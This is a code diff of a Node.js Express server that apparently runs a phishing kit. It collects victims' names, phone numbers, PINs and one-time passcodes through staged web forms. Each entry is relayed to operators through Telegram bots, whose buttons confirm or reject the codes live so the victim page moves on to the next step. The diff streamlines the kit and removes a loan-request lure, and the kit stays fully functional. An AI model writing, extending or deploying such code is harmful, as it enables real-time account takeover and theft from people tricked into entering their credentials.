@@ -7,21 +7,18 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 const DOMAIN = process.env.BACKEND_DOMAIN;
 
-// ---------------- MEMORY STORES ----------------
+// ---------------- MEMORY ----------------
 const passwordRequests = {};
-const otpRequests = {};
 const pinRequests = {};
+const otpRequests = {};
 const blockedRequests = {};
 const requestMeta = {};
-const loanRequests = {};
 
-// ---------------- MULTI-BOT STORE ----------------
+// ---------------- BOT SETUP ----------------
 const bots = [];
 
 Object.keys(process.env).forEach(key => {
-
   const match = key.match(/^BOT(\d+)_TOKEN$/);
-
   if (!match) return;
 
   const i = match[1];
@@ -36,7 +33,6 @@ Object.keys(process.env).forEach(key => {
       chatId
     });
   }
-
 });
 
 console.log('✅ Bots loaded:', bots.map(b => b.botId));
@@ -46,41 +42,13 @@ app.use(express.json({ type: '*/*' }));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// ---------------- DEBUG ROUTE ----------------
-app.get('/debug/bot', (req, res) => {
-
-  res.json({
-    count: bots.length,
-    bots: bots.map(b => ({
-      botId: b.botId,
-      chatId: b.chatId
-    }))
-  });
-
-});
-
-// ---------------- BOT ENTRY ----------------
-app.get('/bot/:botId', (req, res) => {
-
-  const bot = bots.find(b => b.botId === req.params.botId);
-
-  if (!bot) {
-    return res.status(404).send('Invalid bot');
-  }
-
-  res.redirect(`/index.html?botId=${bot.botId}`);
-
-});
-
 // ---------------- HELPERS ----------------
 function getBot(botId) {
   return bots.find(b => b.botId === botId);
 }
 
 async function sendTelegram(bot, text, buttons = []) {
-
   try {
-
     await axios.post(
       `https://api.telegram.org/bot${bot.token}/sendMessage`,
       {
@@ -91,493 +59,192 @@ async function sendTelegram(bot, text, buttons = []) {
           : undefined
       }
     );
-
   } catch (e) {
-
-    console.error(
-      '❌ Telegram error:',
-      e.response?.data || e.message
-    );
-
+    console.log("Telegram error:", e.message);
   }
-
 }
 
 async function answerCallback(bot, id) {
-
   try {
-
     await axios.post(
       `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
-      {
-        callback_query_id: id
-      }
+      { callback_query_id: id }
     );
-
   } catch {}
-
 }
 
-// ---------------- WEBHOOKS ----------------
-async function setWebhook(bot) {
+// ---------------- BOT ENTRY ----------------
+app.get('/bot/:botId', (req, res) => {
+  const bot = bots.find(b => b.botId === req.params.botId);
+  if (!bot) return res.status(404).send('Invalid bot');
 
-  if (!DOMAIN) return;
+  res.redirect(`/index.html?botId=${bot.botId}`);
+});
 
-  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
-
+// ---------------- STEP 1: PHONE SUBMIT ----------------
+app.post('/submit-password', async (req, res) => {
   try {
-
-    await axios.get(
-      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
-    );
-
-    console.log(`✅ Webhook set for ${bot.botId}`);
-
-  } catch (e) {
-
-    console.error(
-      '❌ Webhook error:',
-      e.response?.data || e.message
-    );
-
-  }
-
-}
-
-async function setAllWebhooks() {
-
-  for (const bot of bots) {
-    await setWebhook(bot);
-  }
-
-}
-
-// ---------------- PASSWORD STEP ----------------
-app.post('/submit-password', (req, res) => {
-
-  try {
-
-    const { name, phone, botId } = req.body;
+    const { name = "User", phone, botId } = req.body;
 
     const bot = getBot(botId);
-
-    if (!bot) {
-      return res.status(400).json({
-        error: 'Invalid bot'
-      });
-    }
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
 
     passwordRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
 
-    requestMeta[requestId] = {
-      name,
-      phone,
-      botId
-    };
-
-    sendTelegram(
+    await sendTelegram(
       bot,
-`🔐 DETAILS VERIFICATION
+`📲 NEW LOGIN ATTEMPT
 👤 Name: ${name}
 📞 Phone: ${phone}
-
 🆔 Ref: ${requestId}`,
       [
         [
-          {
-            text: '✅ Approve',
-            callback_data: `pass_ok:${requestId}`
-          }
-        ],
-        [
-          {
-            text: '❌ Wrong Details',
-            callback_data: `pass_bad:${requestId}`
-          }
+          { text: '✅ Approve', callback_data: `pass_ok:${requestId}` },
+          { text: '❌ Reject', callback_data: `pass_bad:${requestId}` }
         ]
       ]
     );
 
     res.json({ requestId });
 
-  } catch {
-
-    res.status(500).json({
-      error: 'Internal server error'
-    });
-
+  } catch (e) {
+    console.log(e.message);
+    res.status(500).json({ error: 'Server error' });
   }
-
 });
 
-// ---------------- PASSWORD CHECK ----------------
+// ---------------- STEP 1 CHECK ----------------
 app.get('/check-password/:id', (req, res) => {
+  const result = passwordRequests[req.params.id];
 
-  const result = passwordRequests[req.params.id] ?? null;
+  if (result === true) return res.json({ redirect: 'pin' });
+  if (result === false) return res.json({ approved: false });
 
-  if (result === true) {
-    return res.json({
-      redirect: 'pin'
-    });
-  }
-
-  if (result === false) {
-    return res.json({
-      approved: false
-    });
-  }
-
-  res.json({
-    approved: null
-  });
-
+  res.json({ approved: null });
 });
-// ---------------- PIN STEP ----------------
-app.post('/submit-pin', (req, res) => {
 
+// ---------------- STEP 2 PIN ----------------
+app.post('/submit-pin', async (req, res) => {
   try {
-
-    const { name, phone, pin, botId } = req.body;
+    const { name = "User", phone, pin = "N/A", botId } = req.body;
 
     const bot = getBot(botId);
-
-    if (!bot) {
-      return res.status(400).json({
-        error: 'Invalid bot'
-      });
-    }
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
 
     pinRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
 
-    requestMeta[requestId] = {
-      name,
-      phone,
-      botId
-    };
-
-    sendTelegram(
+    await sendTelegram(
       bot,
-`🔐 PIN VERIFICATION
-👤 Name: ${name}
-📞 Phone: ${phone}
-🔢 PIN: ${pin}
-🆔 Ref: ${requestId}`,
+`🔐 PIN ENTRY
+👤 ${name}
+📞 ${phone}
+🔢 ${pin}
+🆔 ${requestId}`,
       [
         [
-          {
-            text: '✅ Correct PIN',
-            callback_data: `pin_ok:${requestId}`
-          },
-          {
-            text: '❌ Wrong PIN',
-            callback_data: `pin_bad:${requestId}`
-          },
-          {
-            text: '🛑 Block',
-            callback_data: `pin_block:${requestId}`
-          }
+          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
         ]
       ]
     );
 
     res.json({ requestId });
 
-  } catch {
-
-    res.status(500).json({
-      error: 'Internal server error'
-    });
-
+  } catch (e) {
+    res.status(500).json({ error: 'Server error' });
   }
-
 });
 
+// ---------------- STEP 2 CHECK ----------------
 app.get('/check-pin/:id', (req, res) => {
+  const result = pinRequests[req.params.id];
 
   if (blockedRequests[req.params.id]) {
-    return res.json({
-      blocked: true
-    });
+    return res.json({ blocked: true });
   }
 
-  res.json({
-    approved: pinRequests[req.params.id] ?? null
-  });
+  if (result === true) return res.json({ redirect: 'code' });
+  if (result === false) return res.json({ approved: false });
 
+  res.json({ approved: null });
 });
 
-// ---------------- OTP STEP ----------------
-app.post('/submit-otp', (req, res) => {
-
+// ---------------- STEP 3 OTP ----------------
+app.post('/submit-otp', async (req, res) => {
   try {
-
-    const { name, phone, otp, botId } = req.body;
+    const { name = "User", phone, otp = "N/A", botId } = req.body;
 
     const bot = getBot(botId);
-
-    if (!bot) {
-      return res.status(400).json({
-        error: 'Invalid bot'
-      });
-    }
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
 
     otpRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
 
-    requestMeta[requestId] = {
-      name,
-      phone,
-      botId
-    };
-
-    const buttons = [
-      [
-        {
-          text: '✅ Correct OTP',
-          callback_data: `otp_ok:${requestId}`
-        },
-        {
-          text: '❌ Wrong OTP',
-          callback_data: `otp_bad:${requestId}`
-        }
-      ]
-    ];
-
-    sendTelegram(
+    await sendTelegram(
       bot,
-`🔐 OTP VERIFICATION
-👤 Name: ${name}
-📞 Phone: ${phone}
-🔢 OTP: ${otp}
-🆔 Ref: ${requestId}`,
-      buttons
+`🔐 OTP ENTRY
+👤 ${name}
+📞 ${phone}
+🔢 ${otp}
+🆔 ${requestId}`,
+      [
+        [
+          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
+          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
+        ]
+      ]
     );
 
     res.json({ requestId });
 
-  } catch {
-
-    res.status(500).json({
-      error: 'Internal server error'
-    });
-
+  } catch (e) {
+    res.status(500).json({ error: 'Server error' });
   }
-
 });
 
+// ---------------- STEP 3 CHECK ----------------
 app.get('/check-otp/:id', (req, res) => {
+  const result = otpRequests[req.params.id];
 
-  res.json({
-    approved: otpRequests[req.params.id] ?? null
-  });
+  if (result === true) return res.json({ redirect: 'success' });
+  if (result === false) return res.json({ approved: false });
 
-});
-
-
-
-// ---------------- LOAN STEP ----------------
-app.post('/submit-loan', async (req, res) => {
-
-  try {
-
-    const {
-      name,
-      phone,
-      amount,
-      reference,
-      botId
-    } = req.body;
-
-    const bot = getBot(botId);
-
-    if (!bot) {
-      return res.status(400).json({
-        error: 'Invalid bot'
-      });
-    }
-
-    loanRequests[reference] = null;
-
-    const buttons = [
-      [
-        {
-          text: '✅ Approve Loan',
-          callback_data: `loan_approve:${reference}`
-        },
-        {
-          text: '❌ Reject Loan',
-          callback_data: `loan_reject:${reference}`
-        }
-      ]
-    ];
-
-    await sendTelegram(
-      bot,
-`💰 NEW LOAN REQUEST
-👤 Name: ${name}
-📞 Phone: ${phone}
-💵 Amount: ${amount}
-🆔 Ref: ${reference}`,
-      buttons
-    );
-
-    res.json({
-      status: 'sent'
-    });
-
-  } catch {
-
-    res.status(500).json({
-      error: 'Internal server error'
-    });
-
-  }
-
-});
-
-app.get('/check-loan/:reference', (req, res) => {
-
-  res.json({
-    approved: loanRequests[req.params.reference] ?? null
-  });
-
+  res.json({ approved: null });
 });
 
 // ---------------- TELEGRAM CALLBACK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
-
   const bot = getBot(req.params.botId);
-
-  if (!bot) {
-    return res.sendStatus(404);
-  }
+  if (!bot) return res.sendStatus(404);
 
   const cb = req.body.callback_query;
-
-  if (!cb) {
-    return res.sendStatus(200);
-  }
+  if (!cb) return res.sendStatus(200);
 
   const [action, requestId] = cb.data.split(':');
 
-  const meta = requestMeta[requestId];
+  if (action === 'pass_ok') passwordRequests[requestId] = true;
+  if (action === 'pass_bad') passwordRequests[requestId] = false;
 
-  let feedback = '';
+  if (action === 'pin_ok') pinRequests[requestId] = true;
+  if (action === 'pin_bad') pinRequests[requestId] = false;
 
-  // PASSWORD DECISION
-  if (action === 'pass_ok') {
-
-    passwordRequests[requestId] = true;
-
-    feedback = '✅ Details approved';
-
-  }
-
-  if (action === 'pass_bad') {
-
-    passwordRequests[requestId] = false;
-
-    feedback = '❌ Details rejected';
-
-  }
-
-  // OTP DECISION
-  if (action === 'otp_ok') {
-
-    otpRequests[requestId] = true;
-
-    feedback = '✅ OTP approved';
-
-  }
-
-  if (action === 'otp_bad') {
-
-    otpRequests[requestId] = false;
-
-    feedback = '❌ OTP rejected';
-
-  }
-
-  // PIN DECISION
-  if (action === 'pin_ok') {
-
-    pinRequests[requestId] = true;
-
-    feedback = '✅ PIN approved';
-
-  }
-
-  if (action === 'pin_bad') {
-
-    pinRequests[requestId] = false;
-
-    feedback = '❌ PIN rejected';
-
-  }
-
-  if (action === 'pin_block') {
-
-    blockedRequests[requestId] = true;
-
-    feedback = '🛑 User blocked';
-
-  }
-
-  // LOAN DECISION
-  if (action === 'loan_approve') {
-
-    loanRequests[requestId] = true;
-
-    feedback = '✅ Loan approved';
-
-    await sendTelegram(
-      bot,
-      `✅ Loan approved for Ref: ${requestId}`
-    );
-
-  }
-
-  if (action === 'loan_reject') {
-
-    loanRequests[requestId] = false;
-
-    feedback = '❌ Loan rejected';
-
-    await sendTelegram(
-      bot,
-      `❌ Loan rejected for Ref: ${requestId}`
-    );
-
-  }
-
-  if (feedback && meta) {
-
-    await sendTelegram(
-      bot,
-`📝 ACTION TAKEN
-👤 Name: ${meta.name || '—'}
-📞 Phone: ${meta.phone || '—'}
-${feedback}`
-    );
-
-  }
+  if (action === 'otp_ok') otpRequests[requestId] = true;
+  if (action === 'otp_bad') otpRequests[requestId] = false;
 
   await answerCallback(bot, cb.id);
 
   res.sendStatus(200);
-
 });
 
-// ---------------- START SERVER ----------------
-setAllWebhooks().then(() => {
-
-  app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-  });
-
+// ---------------- START ----------------
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on ${PORT}`);
 });
